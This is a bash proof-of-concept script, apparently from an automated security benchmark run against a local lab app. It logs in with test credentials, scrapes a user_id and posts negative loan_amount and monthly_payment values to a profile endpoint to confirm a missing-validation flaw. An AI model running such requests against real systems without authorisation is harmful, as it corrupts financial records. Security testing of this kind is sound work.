#!/bin/bash
# POC: Demonstrates business logic vulnerability where the profile endpoint accepts negative values for financial fields (loan_amount, loan_term_months, monthly_payment) without validation
# Target: ./repo
# Created: 2025-11-07T16:23:49.173Z
# Session: benchmark-XBEN-023-24-mhp1zrww

# POC for Business Logic Vulnerability - Negative Loan Amount Accepted
# This script demonstrates that the profile update endpoint accepts negative financial values

TARGET_URL="http://localhost:5000"
USERNAME="test"
PASSWORD="test"

echo "[*] Business Logic Vulnerability POC - Negative Loan Amount"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate with test credentials
echo "[+] Step 1: Authenticating with test credentials..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET_URL/login" \
  -d "username=$USERNAME&password=$PASSWORD")

if echo "$LOGIN_RESPONSE" | grep -q "redirect\|<script>"; then
  echo "[✓] Authentication successful"
else
  echo "[✗] Authentication may have failed"
fi

# Step 2: Get profile page to extract user_id
echo ""
echo "[+] Step 2: Getting profile page..."
PROFILE_PAGE=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/profile")

# Extract user_id from input field - try multiple patterns
USER_ID=$(echo "$PROFILE_PAGE" | grep -oP 'name="user_id"[^>]*value="\K[^"]+' | head -1)

if [ -z "$USER_ID" ]; then
  # Try alternative pattern
  USER_ID=$(echo "$PROFILE_PAGE" | grep -oP 'user_id.*value="\K[^"]+' | head -1)
fi

if [ -z "$USER_ID" ]; then
  # If still not found, try looking in the page content
  USER_ID=$(echo "$PROFILE_PAGE" | grep -oE 'value="[0-9]+"' | head -1 | grep -oE '[0-9]+')
fi

if [ -z "$USER_ID" ]; then
  echo "[✗] Could not extract user_id from profile page"
  echo "[*] Trying with hardcoded user_id=11"
  USER_ID="11"
fi

echo "[✓] Using User ID: $USER_ID"
echo ""

# Step 3: Submit negative loan_amount value
echo "[+] Step 3: Submitting POST request with negative loan_amount (-999999)..."
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST "$TARGET_URL/profile" \
  -d "user_id=$USER_ID&name=Test&lastname=User&email=test@test.com&loan_amount=-999999&loan_term_months=12&monthly_payment=-100" > /tmp/post_response.txt

echo "[✓] POST request submitted (Status: $(cat /tmp/post_response.txt | grep -o '<[^>]*>' | head -1))"
echo ""

# Step 4: Verify if negative value was stored
echo "[+] Step 4: Retrieving profile to verify storage..."
sleep 1
VERIFY_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/profile?user_id=$USER_ID")

# Save response for debugging
echo "$VERIFY_RESPONSE" > /tmp/verify_response.txt

# Check for negative loan_amount in response
if echo "$VERIFY_RESPONSE" | grep -q -- '-999999'; then
  echo "[✓] VULNERABILITY CONFIRMED!"
  echo "[✓] Negative value (-999999) found in response"
  echo ""
  echo "[*] Extracted evidence:"
  grep -o 'value="[^"]*-[0-9]*[^"]*"' /tmp/verify_response.txt | head -3
  exit 0
fi

# Check for negative monthly_payment
if echo "$VERIFY_RESPONSE" | grep -q -- '-100'; then
  echo "[✓] VULNERABILITY CONFIRMED!"
  echo "[✓] Negative monthly_payment (-100) found in response"
  exit 0
fi

# Alternative: check if loan_amount field shows the negative value differently
if grep -qE 'loan_amount.*value="?-[0-9]+' /tmp/verify_response.txt; then
  echo "[✓] VULNERABILITY CONFIRMED!"
  echo "[✓] Negative loan_amount detected in response"
  grep -o 'loan_amount[^>]*' /tmp/verify_response.txt | head -1
  exit 0
fi

echo "[*] Checking response content for any loan values..."
grep -iE '(loan_amount|monthly_payment)' /tmp/verify_response.txt | head -3

echo ""
echo "[✗] Vulnerability confirmation inconclusive"
echo "[*] Response length: $(wc -c < /tmp/verify_response.txt) bytes"
exit 1